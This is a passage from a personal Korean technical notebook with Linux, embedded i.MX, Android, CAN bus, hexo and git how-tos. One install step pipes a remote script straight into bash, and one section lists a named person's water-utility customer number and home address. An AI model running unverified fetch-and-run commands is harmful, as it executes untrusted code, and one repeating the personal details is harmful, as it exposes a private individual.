컴퓨터를 정해진 시간에 자동 끄는 것은 cron등에 shutdown 명령을설정해 주면 된다. 껴져 있는 pc를 켜는 것은 wakeonlan 을 이용할 수있다. 하지만 정해진 시간에 자동으로 켜지는 것은 외부에서 wakeonlan을자동 실행하도록 하는 방법이 있겠지만 그보다 rtcwake를 이용하면컴퓨터 부팅시간을 자동 조절할 수 있다.  

```text
sudo rtcwake -m [type of suspend] -s [number of seconds]
$ sudo rtcwake -m mem -s 60
suspend to ram 상태에 있다가 60초 후 자동 깨어난다.
```

type of suspend에는 아래와 같은 것이 있다.  

-   standby
-   mem
-   disk
-   off
-   no

특정 시간에 깨어나기  

```text
$ sudo rtcwake -m mem -l -t $(date +%s -d 'tomorrow 06:30')
```

-l 옵션은 local time 을 사용하겠다는 것이다.  
-t 옵션은 구체적인 시간을 지정할 수 있다.  

[howtogeek](https://www.howtogeek.com/121241/how-to-make-your-linux-pc-wake-from-sleep-automatically/)  


### <span class="section-num">3.309</span> systemd.socket 을 이용한 네트워크 서비스 {#systemd-dot-socket-을-이용한-네트워크-서비스}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-12-28 금 15:16&gt;</span></span>  
systemd socket 을 이용하면 특정 포트에 요청이 올 경우에 서비스를제공하도록 할 수 있다. 데몬이 계속 실행되어 있지 않고 socket  
요청시에만 실행되므로 시스템 자원을 절약할 수 있다.  
dropbear 서비스를 예료 들어 ssh 요청이 있을때 서비스가 활성화 되는예를 보자.  

1.  /lib/systemd/system/dropbear.socket  
    
    ```text
    [Unit]
    Conflicts=dropbear.service
    
    [Socket]
    ListenStream=22
    Accept=yes
    
    [Install]
    WantedBy=sockets.target
    Also=dropbearkey.service
    ```
    
    ListenStream=22 로 설정되어 ssh connection이 요청되었을 시서비스가 실행되는데 systemd.socket man 페이지에 보면  
    Accept=yes 로 되어 있을 경우 socketfile 과 같은 이름에  
    @를 추가한 이름의 서비스가 실행된다고 한다.  
    위의 경우는 dropbear@.service 가 실행된다.

2.  /lib/systemd/system/dropbear@.service  
    
    ```text
    [Unit]
    Description=SSH Per-Connection Server
    Wants=dropbearkey.service
    After=syslog.target dropbearkey.service
    
    [Service]
    Environment="DROPBEAR_RSAKEY_DIR=/etc/dropbear"
    EnvironmentFile=-/etc/default/dropbear
    ExecStart=-/usr/sbin/dropbear -i -r ${DROPBEAR_RSAKEY_DIR}/dropbear_rsa_host_key $DROPBEAR_EXTRA_ARGS
    ExecReload=/bin/kill -HUP $MAINPID
    StandardInput=socket
    KillMode=process
    ```


### <span class="section-num">3.310</span> local mac address {#local-mac-address}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-02 수 14:42&gt;</span></span>  
mac address 의 처음 3 바이트는 Organizationally Unique Identifier, or  
OUI 라고 하는데 IEEE 해서 할당하고 예약된 블록을 받기 위해서는 2000  
달러를 내야한다.  
로컬 맥 어드레스를 사용하기 위해서는 첫번째 바이트의 2번째 비트를 1롤설정하고 첫번째 바이트의 첫번째 비트를 0으로 설정한다.  
그러면 아래와 같은 4가지 형태의 주소형태를 로컬 맥주소로 사용할 수있다.  


#### <span class="section-num">3.310.1</span> x2-xx-xx-xx-xx-xx {#x2-xx-xx-xx-xx-xx}


#### <span class="section-num">3.310.2</span> x6-xx-xx-xx-xx-xx {#x6-xx-xx-xx-xx-xx}


#### <span class="section-num">3.310.3</span> xA-xx-xx-xx-xx-xx {#xa-xx-xx-xx-xx-xx}


#### <span class="section-num">3.310.4</span> xE-xx-xx-xx-xx-xx {#xe-xx-xx-xx-xx-xx}

[honeywell](https://honeywellaidc.force.com/supportppr/s/article/Locally-Administered-MAC-addresses)  
<http://www.noah.org/wiki/MAC%5Faddress>  


### <span class="section-num">3.311</span> libpng warning: iCCP: known incorrect sRGB profile {#libpng-warning-iccp-known-incorrect-srgb-profile}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-02 수 18:06&gt;</span></span>  
linux 에서 위와 같은 메시지가 뜨는 경우가 있다.  
icc profile check 시 나타나는 메시지 인데 이 메시지를 피하기 위해서는  
iCCP chunk 를 png 파일에서 제거 하면 된다.  

```text
$ mogrify *.png
하위 디렉토리까지 변경하려면
$ find . -type f -name '*.png' -exec mogrify {} \;
```


### <span class="section-num">3.312</span> android bootanimation 변경 {#android-bootanimation-변경}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-08 화 14:33&gt;</span></span>  
안드로이드 시작시 animation을 변경할 수 있다.  
bootanimation.zip 파일을 참고하여 원하는 상태로 변경한 다음  
/system/media 아래나 /data/local 아래에 복사하면 된다.  
[how-to-change-customize-create-android-boot-animation-guide](https://www.addictivetips.com/mobile/how-to-change-customize-create-android-boot-animation-guide/)  


### <span class="section-num">3.313</span> u-boot version 보기 {#u-boot-version-보기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-09 수 15:25&gt;</span></span>  
부팅후 u-boot version을 알 수 있는 방법  

```text
root@imx6qpdlsolox:~# strings /dev/mmcblk2boot0|grep U-Boot                                                                                                       
Invalid partition type "%.32s" (expect "U-Boot")
U-Boot.armv7
MU-Boot EFI: Relocation at %p is out of range (%lx)
No valid device tree binary found - please append one to U-Boot binary, use u-boot-dtb.bin or define CONFIG_OF_EMBED. For sandbox, use -d <file.dtb>
U-Boot
U-Boot 2017.03-00013-g6f7fded (Jan 03 2019 - 17:39:12 +0900)
Error: %d bit/pixel bitmaps not supported by U-Boot
```

[stackoverflow](https://stackoverflow.com/questions/5781738/getting-u-boots-version-from-userspace)  


### <span class="section-num">3.314</span> IMX rootfs ownership {#imx-rootfs-ownership}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-09-11 화 11:07&gt;</span></span>  
전부 루트이고 나머지는 다음과 같다.  

```text
-rw-r--r-- 1 1008 1008 80  9월 17  2016 ./usr/lib/gio/modules/giomodule.cache
drwxr-xr-x 4 996 994 4096  9월 17  2016 ./var/lib/nfs/statd
drwx------ 2 996 994 4096  9월  9  2016 ./var/lib/nfs/statd/sm
-rw-r--r-- 1 996 994 0  9월  9  2016 ./var/lib/nfs/statd/state
drwx------ 2 996 994 4096  9월  9  2016 ./var/lib/nfs/statd/sm.bak
drwxr-xr-x 2 messagebus messagebus 4096  9월  9  2016 ./var/lib/dbus
```


### <span class="section-num">3.315</span> linux bonding 설정 {#linux-bonding-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-07-13 금 15:26&gt;</span></span>  


#### <span class="section-num">3.315.1</span> 커널 설정 {#커널-설정}

```text
CONFIG_BONDING=m
```


#### <span class="section-num">3.315.2</span> Configuring Bonding Manually via Sysfs {#configuring-bonding-manually-via-sysfs}

imx board에서 /etc/network/interfaces 파일을 이용한  
bonding 설정은 지원되지 않는다. 그래서 sysfs 와 ip util을사용하여 설정하여야 한다.  

1.   device 추가및 제거

    1.   추가
    
        ```text
        # echo +bond1 > /sys/class/net/bonding_masters
        ```
    
    2.   제거
    
        ```text
        # echo -bond1 > /sys/class/net/bonding_masters
        ```

2.   slave 추가및 제거

    1.   추가
    
        ```text
        # echo +eth1 > /sys/class/net/bond0/bonding/slaves
        ```
    
    2.   제거
    
        ```text
        # echo -eth1 > /sys/class/net/bond0/bonding/slaves
        ```

3.   모드 변경

    ```text
    # ifconfig bond0 down
    # echo active-backup > /sys/class/net/bond0/bonding/mode
    ```

4.   enable MII monitoring on bond0 with a 1 second interval

    ```text
    # echo 1000 > /sys/class/net/bond0/bonding/miimon
    ```

5.   Example Configuration

    ```text
    # insmod /home/root/bonding.ko max_bonds=2 mode=active-backup miimon=100
    또는
    # modprobe bonding max_bonds=2 mode=active-backup miimon=100
    # ifconfig bond0 192.168.0.46 netmask 255.255.255.0 up
    # ifconfig bond1 192.168.0.47 netmask 255.255.255.0 up
    # ip link set eth1 master bond0
    # ip link set eth2 master bond0
    # ip link set eth3 master bond1
    # ip link set eth4 master bond1
    ```

6.   참조

    KERNEL/Documentation/networking/bonding.txt\* PLAN  


### <span class="section-num">3.316</span> cannon mf8284cw printer 설정 {#cannon-mf8284cw-printer-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-08-09 목 15:18&gt;</span></span>  
캐논 미국사이트에서 드라이버를 받아 설치한 다음 cups 설정을 한다.  
8284cw 의 경우는 제품 목록에 없다.  
Color imageCLASS MF8280Cw로 검색하여 관련 리눅스 드라이버를다운로드한다.  
<https://wiki.debian.org/PrinterDriver/Canon/UFR-II>  
<https://www.usa.canon.com/internet/portal/us/home>  


### <span class="section-num">3.317</span> exclude directory in find {#exclude-directory-in-find}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-08-14 화 11:03&gt;</span></span>  

```text
find . -type d \( -path dir1 -o -path dir2 -o -path dir3 \) -prune -o -print
```

[stackoverflow](https://stackoverflow.com/questions/4210042/how-to-exclude-a-directory-in-find-command)  


### <span class="section-num">3.318</span> CAN (Controller Area Network) communication {#can--controller-area-network--communication}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-08-21 화 22:12&gt;</span></span>  


#### <span class="section-num">3.318.1</span> start {#start}

```text
$ ip link set canX up type can bitrate 125000
```


#### <span class="section-num">3.318.2</span> stop {#stop}

```text
$ ip link set canX down
```


#### <span class="section-num">3.318.3</span> restart {#restart}

```text
$ ip link set canX type can restart
```


#### <span class="section-num">3.318.4</span> automatic bus-off recovery {#automatic-bus-off-recovery}

```text
$ ip link set canX type can restart-ms 100
```


#### <span class="section-num">3.318.5</span> Display CAN device details and statistics {#display-can-device-details-and-statistics}

```text
$ ip -details -statistics link show canX
```


#### <span class="section-num">3.318.6</span> help {#help}

```text
$ ip link set canX type can help
```


#### <span class="section-num">3.318.7</span> send {#send}

send a CAN frame with identifier 0x1A (26 dec) and 8 bytes of data  

```text
$ cansend canX 01a#11223344AABBCCDD
```

send large amount of random CAN data  

```text
$ cangen canX -v
```


#### <span class="section-num">3.318.8</span> receive {#receive}

print all data that is being received by a CAN interface  

```text
$ candump canX
```


### <span class="section-num">3.319</span> android rc.local service 추가하기 :rc.local:android:service:init:selinux: {#android-rc-dot-local-service-추가하기-rc-dot-local-android-service-init-selinux}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-08-22 수 17:28&gt;</span></span>  

1.  device/fsl/sabresd\_6dq/init.rc 파일에서 rc.local service 추가  
    
    ```text
    on property:dev.bootcomplete=1
    start rc_local
    
    service rc_local /system/etc/rc.local
        class main
        user root
        group radio cache inet misc audio sdcard_r sdcard_rw log net_admin net_raw
        seclabel u:object_r:rc_local_exec:s0
        disabled
        oneshot
    
    on boot
    ...
    ```

2.  device/fsl/imx6/imx6.mk 에서 rc.local 파일 복사  
    
    ```text
    PRODUCT_COPY_FILES += \
    ...
         device/fsl/sabresd_6dq/rc.local:system/etc/rc.local	\
    ```
    
    device/fsl/sabresd\_6dq/rc.local  
    
    ```text
    #!/system/bin/sh
    ip link set can0 type can restart-ms 100
    ip link set can1 type can restart-ms 100
    ip link set can0 up type can bitrate 1000000
    ip link set can1 up type can bitrate 1000000
    ```

selinux 관련 에러  
init: Service rc\_local does not have a SELinux domain defined.  
가 나타나면 아래 3,4 를 실행하고 위의 1번 init.rc 파일에서  

```text
seclabel u:object_r:rc_local_exec:s0
```

를 추가한다. 위 예제는 이미 추가되어 있다.  

1.  device/fsl/imx6/sepolicy/rc\_local.te 생성  
    
    ```text
    # rc_local service
    type rc_local, domain;
    type rc_local_exec, exec_type, file_type;
    
    init_daemon_domain(rc_local)
    ```

2.  device/fsl/imx6/sepolicy/file\_contexts 파일에서 아래 추가  
    
    ```text
    /system/etc/rc.local   			u:object_r:rc_local_exec:s0
    ```


#### <span class="section-num">3.319.1</span> 참조 {#참조}

<http://share.yurenchen.com:999/android%5Fnotes/android%5Finit%5Frc.md>  
<https://source.android.com/security/selinux/device-policy>  
<https://blog.csdn.net/jianchi88/article/details/78417202>  
<https://source.android.com/security/selinux/implement>  


### <span class="section-num">3.320</span> bluetooth test {#bluetooth-test}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-08-23 목 15:10&gt;</span></span>  
imx 보드에 murata zp 모듈의 bluetooth 설정 예제이다.  

```text
# echo 2 > /sys/class/gpio/export
# echo out > /sys/class/gpio/gpio2/direction
# echo 0 > /sys/class/gpio/gpio2/value
# sleep 0.1
# echo 1 > /sys/class/gpio/gpio2/value
# hciattach /dev/ttymxc4 bcm43xx 3000000 flow -t 20
bcm43xx_init
Set Controller UART speed to 3000000 bit/s
Flash firmware /etc/firmware/BCM4335C0.ZP.hcd
Set Controller UART speed to 3000000 bit/s
Device setup complete
# hciconfig hci0 up
# hcitool scan
Scanning ...
78:F7:BE:72:07:E6 SDK's GS4
```


### <span class="section-num">3.321</span> NXP I.MX Board pin control {#nxp-i-dot-mx-board-pin-control}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-08-27 월 12:40&gt;</span></span>  
sd pin control 예제  
kernel\_imx/Documentation/devicetree/bindings/pinctrl/fsl,imx-pinctrl.txt  

```text
iomuxc@020e0000 {
	compatible = "fsl,imx6q-iomuxc";
	reg = <0x020e0000 0x4000>;

	/* shared pinctrl settings */
	usdhc4 {
		pinctrl_usdhc4_1: usdhc4grp-1 {
			fsl,pins = <
				MX6QDL_PAD_SD4_CMD__SD4_CMD    0x17059
				MX6QDL_PAD_SD4_CLK__SD4_CLK    0x10059
				MX6QDL_PAD_SD4_DAT0__SD4_DATA0 0x17059
				MX6QDL_PAD_SD4_DAT1__SD4_DATA1 0x17059
				MX6QDL_PAD_SD4_DAT2__SD4_DATA2 0x17059
				MX6QDL_PAD_SD4_DAT3__SD4_DATA3 0x17059
				MX6QDL_PAD_SD4_DAT4__SD4_DATA4 0x17059
				MX6QDL_PAD_SD4_DAT5__SD4_DATA5 0x17059
				MX6QDL_PAD_SD4_DAT6__SD4_DATA6 0x17059
				MX6QDL_PAD_SD4_DAT7__SD4_DATA7 0x17059
			>;
	};
	....
};
Refer to the IOMUXC controller chapter in imx6q datasheet,
0x17059 means enable hysteresis, 47KOhm Pull Up, 50Mhz speed,
80Ohm driver strength and Fast Slew Rate.
User should refer to each SoC spec to set the correct value.
```

0x17059 = 1'0111'0000'0101'1001  
0x10059 = 1'0000'0000'0101'1001  

kernel\_imx/Documentation/devicetree/bindings/pinctrl/fsl,imx6q-pinctrl.txt  

```text
CONFIG bits definition:
PAD_CTL_HYS                     (1 << 16)
PAD_CTL_PUS_100K_DOWN           (0 << 14)
PAD_CTL_PUS_47K_UP              (1 << 14)
PAD_CTL_PUS_100K_UP             (2 << 14)
PAD_CTL_PUS_22K_UP              (3 << 14)
PAD_CTL_PUE                     (1 << 13)
PAD_CTL_PKE                     (1 << 12)
PAD_CTL_ODE                     (1 << 11)
PAD_CTL_SPEED_LOW               (1 << 6)
PAD_CTL_SPEED_MED               (2 << 6)
PAD_CTL_SPEED_HIGH              (3 << 6)
PAD_CTL_DSE_DISABLE             (0 << 3)
PAD_CTL_DSE_240ohm              (1 << 3)
PAD_CTL_DSE_120ohm              (2 << 3)
PAD_CTL_DSE_80ohm               (3 << 3)
PAD_CTL_DSE_60ohm               (4 << 3)
PAD_CTL_DSE_48ohm               (5 << 3)
PAD_CTL_DSE_40ohm               (6 << 3)
PAD_CTL_DSE_34ohm               (7 << 3)
PAD_CTL_SRE_FAST                (1 << 0)
PAD_CTL_SRE_SLOW                (0 << 0)
```


### <span class="section-num">3.322</span> imx uart driver bug fix {#imx-uart-driver-bug-fix}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-09-17 월 10:47&gt;</span></span>  
uart message  

```text
imx-uart 21f4000.serial: overwrite!
or
imx-uart 21f4000.serial: Rx FIFO overrun
```

해결책  
disable the RX-DMA of the desired UART by changing the uart block  
of your DTS file  

```text
&uart5 {
     status = "okay";
     dma-names = "","tx";
};
```

[toradex community](https://www.toradex.com/community/questions/2998/linux-imx6-uart-driver-issues.html)  


### <span class="section-num">3.323</span> linux kernel dynamic debug {#linux-kernel-dynamic-debug}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-09-17 월 11:03&gt;</span></span>  

1.  set kernel option  
    
    ```text
    CONFIG_DYNAMIC_DEBUG=y
    ```
2.  set printk level 8  
    
    ```text
    # echo 8 > /proc/sys/kernel/printk
    ```
3.  config dynamic debug behaviour  
    
    ```text
    echo 'file svcsock.c +p' > /sys/kernel/debug/dynamic_debug/control
    ```

all pr\_debug()/dev\_dbg() and  
print\_hex\_dump\_debug()/print\_hex\_dump\_bytes()  
calls can be dynamically enabled  


#### <span class="section-num">3.323.1</span> 링크 {#링크}

<https://www.kernel.org/doc/html/v4.11/admin-guide/dynamic-debug-howto.html>  


### <span class="section-num">3.324</span> 빌드 시간 단축 {#빌드-시간-단축}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-18 금 16:01&gt;</span></span>  
안드로이드, yocto, kernel등을 빌드할 때 빌드 시간을 단축하는 방법이없을까 생각해 보았다. 컴파일 속도를 높이기 위해 cache를 사용한다.  
하지만 이 cache 데이터를 ssd 가 아닌 하드디스크에 저장한다. 용량이허락한다면 ssd에 저장위치를 바꿔서 테스트 해 보아야 겠다.  
다음은 각각의 cache 저장위치이다.  


#### <span class="section-num">3.324.1</span> android {#android}

android 의 캐쉬 디렉토리는 <user-home>/.android/build-cache  
이다.  
ANDROID\_SDK\_HOME  
user.home  
HOME  
위 경로 변수 중 하나를 구성하면 Android Studio가 그 대신  
<path-variable>/.android/build-cache/를 사용합니다위 cache는 android studio 에서 사용하는 cache 이고  
aosp 의 경우 ccache를 사용하면 도움이 된다고 한다.  
<https://developer.android.com/studio/build/build-cache?hl=ko>  


#### <span class="section-num">3.324.2</span> yocto {#yocto}

기본 디렉토리가 없고 build\_dir/conf/local.conf 의  
SSTATE\_DIR 변수를 설정하여 enable 할 수 있다.  

```text
SSTATE_DIR = "/opt/freescale/yocto/imx/sstate-cache"
```

현재(2019-01-18) 83G이다.  


#### <span class="section-num">3.324.3</span> kernel {#kernel}

ccache 설정이 되어 있으므로 ~/.ccache 디렉토리가 기본이다.  
현재(2019-01-18) 36G이다.  
현재 shell 에서 변경하려면  

```text
$ export CCACHE_DIR=/ramdisk/ccache
```

설정파일을 사용하려면  

```text
$ cat > /home/ybgwon/.ccache/ccache.conf
cache_dir = /ramdisk/ccache
```


### <span class="section-num">3.325</span> NXP UUU(Universal Update Utility) 사용법 {#nxp-uuu--universal-update-utility--사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-01-30 수 12:29&gt;</span></span>  


#### <span class="section-num">3.325.1</span> Burn uboot into emmc {#burn-uboot-into-emmc}

```text
$ uuu -b emmc bootloader
```


#### <span class="section-num">3.325.2</span> Burn sdcard image into emmc {#burn-sdcard-image-into-emmc}

```text
$ uuu -b emmc_all bootloader rootfs.sdcard
또는 압축파일일 경우
$ uuu -b emmc_all bootloader rootfs.sdcard.bz2/*
```

<https://github.com/NXPmicro/mfgtools/wiki>  


### <span class="section-num">3.326</span> OPTEE {#optee}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-02-08 금 13:14&gt;</span></span>  


#### <span class="section-num">3.326.1</span> 정의 {#정의}

OP-TEE는 주로 ARM TrustZone(R) 기술에 기반하는 하드웨어 분리메커니즘에 의존하도록 설계되었다. 그러나 가상 머신으로 실행하거나 전용  
CPU로 실행하는 등 TEE의 개념과 목표에 적합한 어떠한 분리 기술과도호환되도록 구조화되었다.  


#### <span class="section-num">3.326.2</span> imx 보드 관련 {#imx-보드-관련}

4.14.78-1.0.0\_ga BSP 부터 기본 옵션 사항이 되었다.  
U-Boot 에 OPTEE load 부분이 default 로 되어 있고부팅후에는 tee-supplicant 가 이미 실행되어 있다.  
단순히 xtest 명령어 입력으로 xtest 를 실행할 수 있다.  

```text
root@imx6qsabresd:~# xtest
```


### <span class="section-num">3.327</span> zero array {#zero-array}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-08-26 월 16:20&gt;</span></span>  
c programming 에서 array size가 0 으로 선언된 경우를 볼 수 있다.  
메모리를 동적으로 할당하기 위한 기술(편법)이다.  
<https://throwbug.com/94/크기가-0인-배열의-의미>  
[stackoverflow](https://stackoverflow.com/questions/36577094/array-of-size-0-at-the-end-of-struct)  


### <span class="section-num">3.328</span> android servie restart :init.rc:android:service:restart: {#android-servie-restart-init-dot-rc-android-service-restart}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-09-02 월 12:02&gt;</span></span>  
안드로이드 init.rc에 있는 서비스를 콘솔에서 restart 하려면 아래와같다.  

```text
root@sabresd_7d:/ # stop sierra_dhcpcd
root@sabresd_7d:/ # start sierra_dhcpcd
```

[stackoverflow](https://stackoverflow.com/questions/15433504/restarting-service-declared-in-init-rc-from-a-system-app-in-a-java-context)  
[stackoverflow](https://stackoverflow.com/questions/15285492/starting-an-android-init-rc-service-from-an-activity)  


### <span class="section-num">3.329</span> 수도요금조회 {#수도요금조회}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-09-27 금 15:39&gt;</span></span>  
<http://i121.seoul.go.kr/cs/cyber/front/cgcalc/NR%5FcgJungInfo.do?%5Fm=m1%5F1%5F1>#  
고객번호 : 029574140  
수용가명 : 강금성주소 : 서울 금천구 독산동 378-150  


### <span class="section-num">3.330</span> node version manager {#node-version-manager}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-07 목 02:30&gt;</span></span>  
node js version을 관리하는 툴이다. nvm 도 있지만 이것이 더 편한 것같다.  
version 관리도 중요하지만 npm으로 설치하는 패키지를 루트 권한 없이일반 사용자 디렉토리에 설치할 수 있어 보안상의 이유로도 권장한다.  


#### <span class="section-num">3.330.1</span> 설치 {#설치}

여러 방법이 있지만 아래 스크립트를 실행하여 설치하는 것이 제일간단하다.  

```text
$ curl -L https://git.io/n-install | bash
```

설치후에는 ~/.bashrc에 실행에 필요한 환경 변수가 추가된다.  

```text
# Added by n-install (see http://git.io/n-install-repo).
export N_PREFIX="$HOME/n"; [[ :$PATH: == *":$N_PREFIX/bin:"* ]] || PATH+=":$N_PREFIX/bin"
```

<https://github.com/tj/n>  


### <span class="section-num">3.331</span> clipboard ssh key에 복사하기 {#clipboard-ssh-key에-복사하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-07 목 17:09&gt;</span></span>  
\#+BEGIN\_EXAMPLE  
$ xclip -sel clip < ~/.ssh/id\_rsa.pub   
\#+END\_EXAMPLE\* Idea  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.332</span> 평생 계획서 짜기 {#평생-계획서-짜기}

꼭 해야할 것들. 해보고 싶은 것들. 살면서 중요하게 우선 순위로 삼아야할 것들을 정리해 보기  
<span class="timestamp-wrapper"><span class="timestamp">&lt;2014-07-01 화 00:19&gt;</span></span>  


### <span class="section-num">3.333</span> 평생 계획표 {#평생-계획표}


#### <span class="section-num">3.333.1</span> 건강 {#건강}

1.   금연

2.   운동 (헬스 1년)

3.   호신술 (10년)

4.   명상 (=>)


#### <span class="section-num">3.333.2</span> 한국어 {#한국어}


#### <span class="section-num">3.333.3</span> 외국어(10년) {#외국어--10년}


#### <span class="section-num">3.333.4</span> 일 {#일}

1.   프로그래밍

2.   개발

3.   사업


#### <span class="section-num">3.333.5</span> 취미 {#취미}

1.   악기

    1.   피아노
    
    2.   기타

2.   여행


#### <span class="section-num">3.333.6</span> 사랑 {#사랑}


#### <span class="section-num">3.333.7</span> 친구 {#친구}


#### <span class="section-num">3.333.8</span> 삶 {#삶}


### <span class="section-num">3.334</span> markdown 문법 체크 {#markdown-문법-체크}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-07 목 21:41&gt;</span></span>  
emacs 에서 마크다운 문법을 flycheck 로 검사하려면 mdl을 설치하고설정하여야 한다. mdl 을 설정하면 flycheck 에서 자동으로 체크가 된다.  

```text
$ gem install mdl
```

mdl 설치후 설정 파일을 가지고 check 하고자 하는 항목을 조절할 수 있다.  

1.  ~/.mdlrc  
    style 파일을 지정하고 이를 사용하도록 한다.  
    
    ```text
    #show_kramdown_warnings true
    #ignore_front_matter true
    style "/home/ybgwon/.mdl-rules.rb"
    ```
2.  ~/.mdl-rules.rb  
    이 파일에서 체크 항목에 대해 설정을 할 수 있다.  
    아래는 orders list 에서 순번을 매기거나 그냥 이거나모두 허용하는 설정이다.  
    
    ```text
    all
    
    # rule 'MD003', :style => :atx
    # rule 'MD004', :style => :dash
    # rule 'MD007', :indent=> 4
    rule 'MD029', :style => :orders_or_one
    # exclude_rule 'MD002'
    # exclude_rule 'MD013'
    # exclude_rule 'MD041'
    # exclude_rule 'MD046'
    ```

<https://github.com/markdownlint/markdownlint>  


### <span class="section-num">3.335</span> hexo {#hexo}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-07 목 22:04&gt;</span></span>  
markdown 과 github pages를 지원하는 블로그 플랫폼  


#### <span class="section-num">3.335.1</span> 설치 {#설치}

```text
$ npm install hexo-cli -g
$ hexo init blog
$ cd blog
$ npm install
```


#### <span class="section-num">3.335.2</span> 테스트 {#테스트}

```text
$ hexo s
http://localhost:4000 접속
```


#### <span class="section-num">3.335.3</span> \_config.yml 설정파일 {#config-dot-yml-설정파일}

적당히 수정. url 부분을 github 페이지 주소로 변경  

```text
# Site
title: YB Gwon's
subtitle: ''
description: 'Personal Blog'
keywords:
author: ybgwon
language: en
timezone: 'Asia/Seoul'

# URL
## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'
url: http://ybgwon.github.io
root: /
```


#### <span class="section-num">3.335.4</span> 배포 설정 {#배포-설정}

1.  배포 패키지 설치  
    
    ```text
    $ npm install hexo-deployer-git --save
    ```
2.  \_config.yml 에서 deploy 부분 수정  
    
    ```text
    deploy:
    type: git
    repo: git@github.com:ybgwon/ybgwon.github.io.git
    branch: master
    message: "{{ now('YYYY-MM-DD HH:mm:ss') }}"
    ```
3.  배포  
    
    ```text
    $ hexo generate --deploy
    또는 간단하게 
    $ hexo g -d
    ```


#### <span class="section-num">3.335.5</span> hexo source 관리 {#hexo-source-관리}

hexo 소스를 github에 프로젝트에 추가하여 백업용으로 관리하는 방법이다.  

1.  github에 프로젝트 하나를 만든다. 나는 hexo\_src로 하였다.
2.  현재 hexo 내용을 git 저장소로 초기화 한다.  
    
    ```text
    $ git init
    $ git add .
    .gitignore 파일에 설정은 이미 되어 있으므로 그냥 commit 하면 됨
    $ git commit -m "initial"
    ```
3.  remote 추가 후 push  
    
    ```text
    $ git remote add origin git@github.com:ybgwon/hexo_src.git
    $ git push -u origin master
    ```


#### <span class="section-num">3.335.6</span> next 테마 사용하기 {#next-테마-사용하기}

1.  저장소에서 submodule로 clone  
    github 에서 submodule 로 관리할 theme 을 fork 해온후 아래 실행  
    
    ```text
    $ git submodule add git@github.com:ybgwon/hexo-theme-next.git themes/next
    ```
2.  commit  
    
    ```text
    $ git commit -m "add submodule next theme"
    ```
3.  \_config.yml에서 theme 부분 변경  
    
    ```text
    # Extensions
    ## Plugins: https://hexo.io/plugins/
    ## Themes: https://hexo.io/themes/
    theme: next
    ```
4.  clean and deploy  
    
    ```text
    $ hexo clean && hexo g -d
    ```


#### <span class="section-num">3.335.7</span> 새 글 작성 {#새-글-작성}

```text
$ hexo new post [post_name]
```


#### <span class="section-num">3.335.8</span> 다른 컴퓨터에서 hexo 저장소 clone 하기 {#다른-컴퓨터에서-hexo-저장소-clone-하기}

1.  clone repo recursive(with submodule)  
    
    ```text
    $ git clone --recursive git@github.com:ybgwon/hexo_src.git hexo
    ```
2.  install 패키지  
    
    ```text
    $ npm install hexo --save
    $ npm install hexo-deployer-git --save
    ```


#### <span class="section-num">3.335.9</span> 관련 링크 {#관련-링크}

<https://www.holaxprogramming.com/2017/04/16/github-page-and-hexo/>  
<https://devhyung.github.io/2019/02/18/Hexo/>  
<https://futurecreator.github.io/2018/07/18/hexo-blog-backup/>  


### <span class="section-num">3.336</span> git 저장소 이전 버전으로 되돌리기 {#git-저장소-이전-버전으로-되돌리기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-07 목 22:43&gt;</span></span>  

```text
$ git reset --hard commit명
```

위 명령으로 로컬 저장소 commit 이전 버전으로 되돌릴 수 있다.  
원격 저장소 까지 되돌리려면 그냥 push 하면 에러가 나고  
-f 옵션을 주어야 한다.  

```text
$ git push -f origin master
```

위와 같은 방법은 여러명이 협업 할 경우 되돌리기 전에 이미 누가  
commit 을 해간 상황이라면 문제가 발생한다. 그래서 공동 작업의 경우는  
revert 명령을 사용하여야 한다.  

```text
$ git revert --no-commit HEAD~3.. # 또는 master~3..master
$ git push
```

아래에 정말 잘 설명한 링크가 있다.  
<https://jupiny.com/2019/03/19/revert-commits-in-remote-repository/>  


### <span class="section-num">3.337</span> git submodule {#git-submodule}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2019-11-07 목 22:50&gt;</span></span>  
git 아래 또다른 git 프로젝트가 있는 경우를 볼 수 있다.  
submodule로 관리되는 경우이며 이렇게 하였을 때 관리의 이점이 있다.  


#### <span class="section-num">3.337.1</span> submodule 추가하기 {#submodule-추가하기}

1.  add  
    
    ```text
    $ git submodule add git@github.com:ybgwon/hexo-theme-next.git
    ```
2.  commit  
    
    ```text
    $ git commit -am "Add submodule"
    ```


#### <span class="section-num">3.337.2</span> 서브 모듈이 있는 프로젝트 clone 하기 {#서브-모듈이-있는-프로젝트-clone-하기}

```text
$ git clone --recursive git@github.com:ybgwon/hexo_src.git hexo
```


#### <span class="section-num">3.337.3</span> submodule 삭제 {#submodule-삭제}

1.  .gitmodule 파일에서 해당 모듈 부분 삭제  
    
    ```text
    $ cat .gitmodules
    [submodule "themes/next"]
            path = themes/next
            url = git@github.com:ybgwon/hexo-theme-next.git
    ```
2.  submodule cache 삭제  
    
    ```text
